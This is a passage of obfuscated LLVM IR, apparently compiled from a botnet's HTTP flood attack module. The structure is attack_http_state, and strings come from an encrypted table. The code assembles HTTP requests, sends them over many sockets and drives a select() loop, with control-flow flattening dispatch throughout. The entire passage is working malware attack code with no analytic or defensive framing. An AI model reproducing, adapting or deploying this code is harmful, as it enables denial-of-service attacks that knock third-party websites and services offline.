  call void @util_zero(i8* %579, i32 10240)
  %580 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %581 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %582 = call i32 @util_strlen(i8* %581)
  %583 = sext i32 %582 to i64
  %584 = getelementptr inbounds i8, i8* %580, i64 %583
  %585 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %586 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %585, i32 0, i32 9
  %587 = getelementptr inbounds [9 x i8], [9 x i8]* %586, i32 0, i32 0
  %588 = call i32 @util_strcpy(i8* %584, i8* %587)
  %589 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %590 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %591 = call i32 @util_strlen(i8* %590)
  %592 = sext i32 %591 to i64
  %593 = getelementptr inbounds i8, i8* %589, i64 %592
  %594 = call i32 @util_strcpy(i8* %593, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %595 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %596 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %597 = call i32 @util_strlen(i8* %596)
  %598 = sext i32 %597 to i64
  %599 = getelementptr inbounds i8, i8* %595, i64 %598
  %600 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %601 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %600, i32 0, i32 6
  %602 = getelementptr inbounds [257 x i8], [257 x i8]* %601, i32 0, i32 0
  %603 = call i32 @util_strcpy(i8* %599, i8* %602)
  %604 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %605 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %606 = call i32 @util_strlen(i8* %605)
  %607 = sext i32 %606 to i64
  %608 = getelementptr inbounds i8, i8* %604, i64 %607
  %609 = call i32 @util_strcpy(i8* %608, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %610 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %611 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %612 = call i32 @util_strlen(i8* %611)
  %613 = sext i32 %612 to i64
  %614 = getelementptr inbounds i8, i8* %610, i64 %613
  %615 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %616 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %615, i32 0, i32 5
  %617 = getelementptr inbounds [512 x i8], [512 x i8]* %616, i32 0, i32 0
  %618 = call i32 @util_strcpy(i8* %614, i8* %617)
  %619 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %620 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %621 = call i32 @util_strlen(i8* %620)
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds i8, i8* %619, i64 %622
  %624 = call i32 @util_strcpy(i8* %623, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %625 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %626 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %627 = call i32 @util_strlen(i8* %626)
  %628 = sext i32 %627 to i64
  %629 = getelementptr inbounds i8, i8* %625, i64 %628
  %630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %630, i32 0, i32 7
  %632 = getelementptr inbounds [129 x i8], [129 x i8]* %631, i32 0, i32 0
  %633 = call i32 @util_strcpy(i8* %629, i8* %632)
  %634 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %635 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %636 = call i32 @util_strlen(i8* %635)
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds i8, i8* %634, i64 %637
  %639 = call i32 @util_strcpy(i8* %638, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 39)
  %640 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %641 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %642 = call i32 @util_strlen(i8* %641)
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds i8, i8* %640, i64 %643
  %645 = call i8* @table_retrieve_val(i32 39, i32* null)
  %646 = call i32 @util_strcpy(i8* %644, i8* %645)
  call void @table_lock_val(i8 zeroext 39)
  %647 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %648 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %649 = call i32 @util_strlen(i8* %648)
  %650 = sext i32 %649 to i64
  %651 = getelementptr inbounds i8, i8* %647, i64 %650
  %652 = call i32 @util_strcpy(i8* %651, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 40)
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %654 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %655 = call i32 @util_strlen(i8* %654)
  %656 = sext i32 %655 to i64
  %657 = getelementptr inbounds i8, i8* %653, i64 %656
  %658 = call i8* @table_retrieve_val(i32 40, i32* null)
  %659 = call i32 @util_strcpy(i8* %657, i8* %658)
  call void @table_lock_val(i8 zeroext 40)
  %660 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %661 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %662 = call i32 @util_strlen(i8* %661)
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds i8, i8* %660, i64 %663
  %665 = call i32 @util_strcpy(i8* %664, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 41)
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %667 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %668 = call i32 @util_strlen(i8* %667)
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds i8, i8* %666, i64 %669
  %671 = call i8* @table_retrieve_val(i32 41, i32* null)
  %672 = call i32 @util_strcpy(i8* %670, i8* %671)
  call void @table_lock_val(i8 zeroext 41)
  %673 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %674 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %675 = call i32 @util_strlen(i8* %674)
  %676 = sext i32 %675 to i64
  %677 = getelementptr inbounds i8, i8* %673, i64 %676
  %678 = call i32 @util_strcpy(i8* %677, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %679 = load i8*, i8** %14, align 8
  %680 = icmp ne i8* %679, null
  %681 = select i1 %680, i32 -1510165495, i32 -1535967888
  store i32 %681, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 42)
  %683 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %684 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %685 = call i32 @util_strlen(i8* %684)
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds i8, i8* %683, i64 %686
  %688 = call i8* @table_retrieve_val(i32 42, i32* null)
  %689 = call i32 @util_strcpy(i8* %687, i8* %688)
  call void @table_lock_val(i8 zeroext 42)
  %690 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %691 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %692 = call i32 @util_strlen(i8* %691)
  %693 = sext i32 %692 to i64
  %694 = getelementptr inbounds i8, i8* %690, i64 %693
  %695 = call i32 @util_strcpy(i8* %694, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %698 = call i32 @util_strlen(i8* %697)
  %699 = sext i32 %698 to i64
  %700 = getelementptr inbounds i8, i8* %696, i64 %699
  %701 = call i8* @table_retrieve_val(i32 47, i32* null)
  %702 = call i32 @util_strcpy(i8* %700, i8* %701)
  %703 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %704 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %705 = call i32 @util_strlen(i8* %704)
  %706 = sext i32 %705 to i64
  %707 = getelementptr inbounds i8, i8* %703, i64 %706
  %708 = call i32 @util_strcpy(i8* %707, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %709 = load i8*, i8** %14, align 8
  %710 = call i32 @util_strlen(i8* %709)
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = call i32 @util_strlen(i8* %712)
  %714 = sext i32 %713 to i64
  %715 = getelementptr inbounds i8, i8* %711, i64 %714
  %716 = call i8* @util_itoa(i32 %710, i32 10, i8* %715)
  %717 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %718 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %719 = call i32 @util_strlen(i8* %718)
  %720 = sext i32 %719 to i64
  %721 = getelementptr inbounds i8, i8* %717, i64 %720
  %722 = call i32 @util_strcpy(i8* %721, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 -1535967888, i32* %switchVar
  br label %loopEnd

; <label>:723:                                    ; preds = %loopEntry
  %724 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %725 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %724, i32 0, i32 15
  %726 = load i32, i32* %725, align 4
  %727 = icmp sgt i32 %726, 0
  %728 = select i1 %727, i32 -750015066, i32 1127770028
  store i32 %728, i32* %switchVar
  br label %loopEnd

; <label>:729:                                    ; preds = %loopEntry
  %730 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %731 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %732 = call i32 @util_strlen(i8* %731)
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %730, i64 %733
  %735 = call i32 @util_strcpy(i8* %734, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  store i32 1733086231, i32* %switchVar
  br label %loopEnd

; <label>:736:                                    ; preds = %loopEntry
  %737 = load i32, i32* %10, align 4
  %738 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %739 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %738, i32 0, i32 15
  %740 = load i32, i32* %739, align 4
  %741 = icmp slt i32 %737, %740
  %742 = select i1 %741, i32 551569588, i32 1163390953
  store i32 %742, i32* %switchVar
  br label %loopEnd

; <label>:743:                                    ; preds = %loopEntry
  %744 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %745 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %746 = call i32 @util_strlen(i8* %745)
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds i8, i8* %744, i64 %747
  %749 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %750 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %749, i32 0, i32 16
  %751 = load i32, i32* %10, align 4
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %750, i64 0, i64 %752
  %754 = getelementptr inbounds [128 x i8], [128 x i8]* %753, i32 0, i32 0
  %755 = call i32 @util_strcpy(i8* %748, i8* %754)
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %758 = call i32 @util_strlen(i8* %757)
  %759 = sext i32 %758 to i64
  %760 = getelementptr inbounds i8, i8* %756, i64 %759
  %761 = call i32 @util_strcpy(i8* %760, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  store i32 -814796087, i32* %switchVar
  br label %loopEnd

; <label>:762:                                    ; preds = %loopEntry
  %763 = load i32, i32* %10, align 4
  %764 = add nsw i32 %763, 1
  store i32 %764, i32* %10, align 4
  store i32 1733086231, i32* %switchVar
  br label %loopEnd

; <label>:765:                                    ; preds = %loopEntry
  %766 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %767 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %768 = call i32 @util_strlen(i8* %767)
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds i8, i8* %766, i64 %769
  %771 = call i32 @util_strcpy(i8* %770, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 1127770028, i32* %switchVar
  br label %loopEnd

; <label>:772:                                    ; preds = %loopEntry
  %773 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %774 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %775 = call i32 @util_strlen(i8* %774)
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds i8, i8* %773, i64 %776
  %778 = call i32 @util_strcpy(i8* %777, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %779 = load i8*, i8** %14, align 8
  %780 = icmp ne i8* %779, null
  %781 = select i1 %780, i32 29923081, i32 1522317737
  store i32 %781, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  %783 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = call i32 @util_strlen(i8* %784)
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds i8, i8* %783, i64 %786
  %788 = load i8*, i8** %14, align 8
  %789 = call i32 @util_strcpy(i8* %787, i8* %788)
  store i32 1522317737, i32* %switchVar
  br label %loopEnd

; <label>:790:                                    ; preds = %loopEntry
  %791 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %792 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %791, i32 0, i32 9
  %793 = getelementptr inbounds [9 x i8], [9 x i8]* %792, i32 0, i32 0
  %794 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %795 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %794, i32 0, i32 10
  %796 = getelementptr inbounds [9 x i8], [9 x i8]* %795, i32 0, i32 0
  %797 = call signext i8 @util_strcmp(i8* %793, i8* %796)
  %798 = icmp ne i8 %797, 0
  %799 = select i1 %798, i32 1154521900, i32 -1515895643
  store i32 %799, i32* %switchVar
  br label %loopEnd

; <label>:800:                                    ; preds = %loopEntry
  %801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %801, i32 0, i32 9
  %803 = getelementptr inbounds [9 x i8], [9 x i8]* %802, i32 0, i32 0
  %804 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %805 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %804, i32 0, i32 10
  %806 = getelementptr inbounds [9 x i8], [9 x i8]* %805, i32 0, i32 0
  %807 = call i32 @util_strcpy(i8* %803, i8* %806)
  store i32 1154521900, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %810 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %809, i32 0, i32 0
  %811 = load i32, i32* %810, align 4
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %814 = call i32 @util_strlen(i8* %813)
  %815 = sext i32 %814 to i64
  %816 = call i64 @send(i32 %811, i8* %812, i64 %815, i32 16384)
  %817 = load i32, i32* %27, align 4
  %818 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %818, i32 0, i32 3
  store i32 %817, i32* %819, align 4
  %820 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %821 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %820, i32 0, i32 1
  store i8 6, i8* %821, align 4
  %822 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %823 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %822, i32 0, i32 0
  %824 = load i32, i32* %823, align 4
  %825 = srem i32 %824, 64
  %826 = zext i32 %825 to i64
  %827 = shl i64 1, %826
  %828 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %829 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %830 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %829, i32 0, i32 0
  %831 = load i32, i32* %830, align 4
  %832 = sdiv i32 %831, 64
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds [16 x i64], [16 x i64]* %828, i64 0, i64 %833
  %835 = load i64, i64* %834, align 8
  %836 = or i64 %835, %827
  store i64 %836, i64* %834, align 8
  %837 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %838 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %837, i32 0, i32 0
  %839 = load i32, i32* %838, align 4
  %840 = load i32, i32* %23, align 4
  %841 = icmp sgt i32 %839, %840
  %842 = select i1 %841, i32 638304019, i32 -1559604108
  store i32 %842, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %845 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %844, i32 0, i32 0
  %846 = load i32, i32* %845, align 4
  %847 = add nsw i32 %846, 1
  store i32 %847, i32* %23, align 4
  store i32 -1559604108, i32* %switchVar
  br label %loopEnd

; <label>:848:                                    ; preds = %loopEntry
  store i32 -679179229, i32* %switchVar
  br label %loopEnd

; <label>:849:                                    ; preds = %loopEntry
  %850 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %851 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %850, i32 0, i32 1
  %852 = load i8, i8* %851, align 4
  %853 = zext i8 %852 to i32
  %854 = icmp eq i32 %853, 6
  %855 = select i1 %854, i32 942831174, i32 423481053
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %858 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %857, i32 0, i32 0
  %859 = load i32, i32* %858, align 4
  %860 = srem i32 %859, 64
  %861 = zext i32 %860 to i64
  %862 = shl i64 1, %861
  %863 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %864 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %865 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %864, i32 0, i32 0
  %866 = load i32, i32* %865, align 4
  %867 = sdiv i32 %866, 64
  %868 = sext i32 %867 to i64
  %869 = getelementptr inbounds [16 x i64], [16 x i64]* %863, i64 0, i64 %868
  %870 = load i64, i64* %869, align 8
  %871 = or i64 %870, %862
  store i64 %871, i64* %869, align 8
  %872 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %873 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %872, i32 0, i32 0
  %874 = load i32, i32* %873, align 4
  %875 = load i32, i32* %23, align 4
  %876 = icmp sgt i32 %874, %875
  %877 = select i1 %876, i32 -1482151838, i32 1650658452
  store i32 %877, i32* %switchVar
  br label %loopEnd

; <label>:878:                                    ; preds = %loopEntry
  %879 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %880 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %879, i32 0, i32 0
  %881 = load i32, i32* %880, align 4
  %882 = add nsw i32 %881, 1
  store i32 %882, i32* %23, align 4
  store i32 1650658452, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  store i32 -1981576125, i32* %switchVar
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  %885 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %885, i32 0, i32 1
  %887 = load i8, i8* %886, align 4
  %888 = zext i8 %887 to i32
  %889 = icmp eq i32 %888, 7
  %890 = select i1 %889, i32 -946473153, i32 344892443
  store i32 %890, i32* %switchVar
  br label %loopEnd

; <label>:891:                                    ; preds = %loopEntry
  %892 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %893 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %892, i32 0, i32 0
  %894 = load i32, i32* %893, align 4
  %895 = srem i32 %894, 64
  %896 = zext i32 %895 to i64
  %897 = shl i64 1, %896
  %898 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %899 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %899, i32 0, i32 0
  %901 = load i32, i32* %900, align 4
  %902 = sdiv i32 %901, 64
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds [16 x i64], [16 x i64]* %898, i64 0, i64 %903
  %905 = load i64, i64* %904, align 8
  %906 = or i64 %905, %897
  store i64 %906, i64* %904, align 8
  %907 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %908 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %907, i32 0, i32 0
  %909 = load i32, i32* %908, align 4
  %910 = load i32, i32* %23, align 4
  %911 = icmp sgt i32 %909, %910
  %912 = select i1 %911, i32 -1042773173, i32 1083948546
  store i32 %912, i32* %switchVar
  br label %loopEnd

; <label>:913:                                    ; preds = %loopEntry
  %914 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %914, i32 0, i32 0
  %916 = load i32, i32* %915, align 4
  %917 = add nsw i32 %916, 1
  store i32 %917, i32* %23, align 4
  store i32 1083948546, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  store i32 1972938174, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 1
  %922 = load i8, i8* %921, align 4
  %923 = zext i8 %922 to i32
  %924 = icmp eq i32 %923, 10
  %925 = select i1 %924, i32 -1896435353, i32 594717924
  store i32 %925, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %928 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %927, i32 0, i32 0
  %929 = load i32, i32* %928, align 4
  %930 = srem i32 %929, 64
  %931 = zext i32 %930 to i64
  %932 = shl i64 1, %931
  %933 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %934 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %934, i32 0, i32 0
  %936 = load i32, i32* %935, align 4
  %937 = sdiv i32 %936, 64
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds [16 x i64], [16 x i64]* %933, i64 0, i64 %938
  %940 = load i64, i64* %939, align 8
  %941 = or i64 %940, %932
  store i64 %941, i64* %939, align 8
  %942 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %943 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %942, i32 0, i32 0
  %944 = load i32, i32* %943, align 4
  %945 = load i32, i32* %23, align 4
  %946 = icmp sgt i32 %944, %945
  %947 = select i1 %946, i32 -2121689877, i32 419477370
  store i32 %947, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  %949 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %950 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %949, i32 0, i32 0
  %951 = load i32, i32* %950, align 4
  %952 = add nsw i32 %951, 1
  store i32 %952, i32* %23, align 4
  store i32 419477370, i32* %switchVar
  br label %loopEnd

; <label>:953:                                    ; preds = %loopEntry
  store i32 -194975719, i32* %switchVar
  br label %loopEnd

; <label>:954:                                    ; preds = %loopEntry
  %955 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %955, i32 0, i32 1
  %957 = load i8, i8* %956, align 4
  %958 = zext i8 %957 to i32
  %959 = icmp eq i32 %958, 11
  %960 = select i1 %959, i32 -149778853, i32 1709547294
  store i32 %960, i32* %switchVar
  br label %loopEnd

; <label>:961:                                    ; preds = %loopEntry
  %962 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %963 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %962, i32 0, i32 1
  store i8 0, i8* %963, align 4
  %964 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %964, i32 0, i32 0
  %966 = load i32, i32* %965, align 4
  %967 = call i32 @close(i32 %966)
  %968 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %969 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %968, i32 0, i32 0
  store i32 -1, i32* %969, align 4
  store i32 2143536667, i32* %switchVar
  br label %loopEnd

; <label>:970:                                    ; preds = %loopEntry
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 1
  store i8 0, i8* %972, align 4
  %973 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %974 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 4
  %976 = call i32 @close(i32 %975)
  %977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %977, i32 0, i32 0
  store i32 -1, i32* %978, align 4
  store i32 2143536667, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  store i32 -194975719, i32* %switchVar
  br label %loopEnd

; <label>:980:                                    ; preds = %loopEntry
  store i32 1972938174, i32* %switchVar
  br label %loopEnd

; <label>:981:                                    ; preds = %loopEntry
  store i32 -1981576125, i32* %switchVar
  br label %loopEnd

; <label>:982:                                    ; preds = %loopEntry
  store i32 -679179229, i32* %switchVar
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  store i32 -1679670361, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  store i32 -1089755431, i32* %switchVar
  br label %loopEnd

; <label>:985:                                    ; preds = %loopEntry
  store i32 1203471678, i32* %switchVar
  br label %loopEnd

; <label>:986:                                    ; preds = %loopEntry
  %987 = load i32, i32* %9, align 4
  %988 = add nsw i32 %987, 1
  store i32 %988, i32* %9, align 4
  store i32 -1089897759, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i32, i32* %23, align 4
  %991 = icmp eq i32 %990, 0
  %992 = select i1 %991, i32 -229456216, i32 1180214649
  store i32 %992, i32* %switchVar
  br label %loopEnd

; <label>:993:                                    ; preds = %loopEntry
  store i32 127342235, i32* %switchVar
  br label %loopEnd

; <label>:994:                                    ; preds = %loopEntry
  %995 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %995, align 8
  %996 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %996, align 8
  %997 = load i32, i32* %23, align 4
  %998 = call i32 @select(i32 %997, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %998, i32* %24, align 4
  %999 = call i64 @time(i64* null) #6
  %1000 = trunc i64 %999 to i32
  store i32 %1000, i32* %27, align 4
  %1001 = load i32, i32* %24, align 4
  %1002 = icmp slt i32 %1001, 1
  %1003 = select i1 %1002, i32 637829779, i32 -163500035
  store i32 %1003, i32* %switchVar
  br label %loopEnd

